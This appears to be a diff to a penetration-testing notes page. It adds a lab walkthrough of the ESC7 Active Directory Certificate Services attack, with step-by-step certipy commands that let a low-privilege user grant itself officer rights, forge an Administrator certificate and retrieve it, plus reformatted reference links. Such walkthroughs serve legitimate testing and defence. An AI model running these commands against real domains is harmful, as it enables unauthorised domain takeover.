@@ -1368,6 +1368,61 @@ certipy req -u peter@range.net -p Password123 -target ca01.range.net -ca 'range-
 certipy auth -pfx administrator.pfx -dc-ip 192.168.86.183
 ```
 
+### ESC7
+This misconfiguration does not apply on certificate template but Certificate Authority (CA) configuration and applies when compromised user/group does have `Manage CA` permission on the CA. Hence, this special ACL can be ab(use)d to add another ACL, `Issue and Managed Certificate` to the controlled user/group in order to *issue* an invalid certificate request based on the certificate ID. 
+
+**Requirements**
+
+| Attributes                   | Value | Pre-requisite |
+| ---------------------------- | ----- | ------------- |
+| ManageCA                     | True  |               |
+| Issue and Manage Certificate | True  | ManageCA      |
+
+
+1. Verify CA configuration with [certipy](https://github.com/ly4k/Certipy). It should identify that the CA configuration is vulnerable to ESC7 attack with `lowpriv` user having `ManageCA` permission on the CA server.
+
+```bash
+certipy find -u 'lowpriv@bionic.local' -p 'Password1234' -dc-ip 10.66.66.3 -stdout -text -enabled -vulnerable
+```
+
+![[Pasted image 20240317084758.png|lowpriv has Manage CA permission on the CA server]]
+
+![[Pasted image 20240317084226.png|GUI view of CA security configuration]]
+
+2. We can basically configuration the CA! Now lets enable `Issue and Manage Certificates` on the compromised user `lowpriv`. Use [certipy](https://github.com/ly4k/Certipy) ca submodule with `-add-officer` flag as follows:
+
+```bash
+certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -add-officer 'lowpriv' -dc-ip 10.66.66.3 -target-ip 10.66.66.3
+```
+
+![[Pasted image 20240317085357.png|Added extra permission for lowpriv user]]
+
+3. Request **SubCA** certificate. This should throw errors `CERTSRV_E_TEMPLATE_DENIED`, basically saying we don't have permission to request for specified certificate. Please save the private key to be used later on.
+
+```bash
+certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -template SubCA -upn 'Administrator@bionic.local' -target 10.66.66.3 -dc-ip 10.66.66.3
+```
+
+![[Pasted image 20240317085720.png|Certipy throws template denied error]]
+
+4. Having `Issue and Manage Certificates` permission enabled. Denied template can easily be issued back. Use [certipy](https://github.com/ly4k/Certipy) ca submodule with `-issue-request` flag with request ID.
+
+```bash
+certipy ca -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -dc-ip 10.66.66.3 -target-ip 10.66.66.3 -issue-request 14
+```
+
+![[Pasted image 20240317085939.png|Certificate issued]]
+
+5. Retrieve back the denied certificate request. Note that this steps will require the previously saved private key `<request-id>.key`.
+
+```bash
+certipy req -u 'lowpriv@bionic.local' -p 'Password1234' -ca bionic-AD-CA -target 10.66.66.3 -retrieve 14
+```
+
+![[Pasted image 20240317090223.png|Retrieve the denied certificate request like a boss]]
+
+6. Proceed with [Pass the Certificate](#pass-the-certificate) attack.
+
 ### ESC8
 This requires NTLMv2 relaying from target identity to the /certsrc/certfnsh.asp endpoint to request a certificate. Below are the steps to reproduce.  In case of successful coerce, relayed NetNTLM can be used to request a certificate as the account itself. 
 
@@ -1456,10 +1511,14 @@ addcomputer.py range.net/Administrator:'Password123' -computer-name 'WIN-EAZXIGM
 ```
 
 For the details explanation of the vulnerability (CVE-2022-26923), you may read the full article [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
->[!ADCS References]
->- https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/
->- https://www.thehacker.recipes/ad/movement/ad-cs/
->- https://mayfly277.github.io/posts/GOADv2-pwning-part6/
+
+{{% callout note %}}
+**ADCS References**
+- https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/
+- https://www.thehacker.recipes/ad/movement/ad-cs/
+- https://mayfly277.github.io/posts/GOADv2-pwning-part6/
+{{% /callout %}}
+
 
 # References
 * https://www.harmj0y.net/
